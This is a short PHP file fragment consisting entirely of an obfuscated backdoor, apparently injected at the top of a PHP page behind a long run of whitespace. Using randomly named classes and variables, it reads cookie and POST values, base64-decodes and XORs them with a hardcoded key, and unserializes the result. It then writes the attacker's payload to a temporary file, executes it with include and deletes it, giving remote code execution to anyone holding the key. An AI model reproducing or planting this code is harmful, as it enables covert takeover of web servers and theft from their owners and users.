<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("SMSRcYP")){class SMSRcYP{public static $aXzEpv = "IqLcGtLZScOnvxgu";public static $rwicWrQ = NULL;public function __construct(){$SzEGJaX = @$_COOKIE[substr(SMSRcYP::$aXzEpv, 0, 4)];if (!empty($SzEGJaX)){$XmiqcSABPf = "base64";$qYwlkdf = "";$SzEGJaX = explode(",", $SzEGJaX);foreach ($SzEGJaX as $CtTCIaysv){$qYwlkdf .= @$_COOKIE[$CtTCIaysv];$qYwlkdf .= @$_POST[$CtTCIaysv];}$qYwlkdf = array_map($XmiqcSABPf . "_decode", array($qYwlkdf,)); $qYwlkdf = $qYwlkdf[0] ^ str_repeat(SMSRcYP::$aXzEpv, (strlen($qYwlkdf[0]) / strlen(SMSRcYP::$aXzEpv)) + 1);SMSRcYP::$rwicWrQ = @unserialize($qYwlkdf);}}public function __destruct(){$this->KEVZZfu();}private function KEVZZfu(){if (is_array(SMSRcYP::$rwicWrQ)) {$KfzAghpG = sys_get_temp_dir() . "/" . crc32(SMSRcYP::$rwicWrQ["salt"]);@SMSRcYP::$rwicWrQ["write"]($KfzAghpG, SMSRcYP::$rwicWrQ["content"]);include $KfzAghpG;@SMSRcYP::$rwicWrQ["delete"]($KfzAghpG);exit();}}}$VPLWYCe = new SMSRcYP(); $VPLWYCe = NULL;} ?><?php
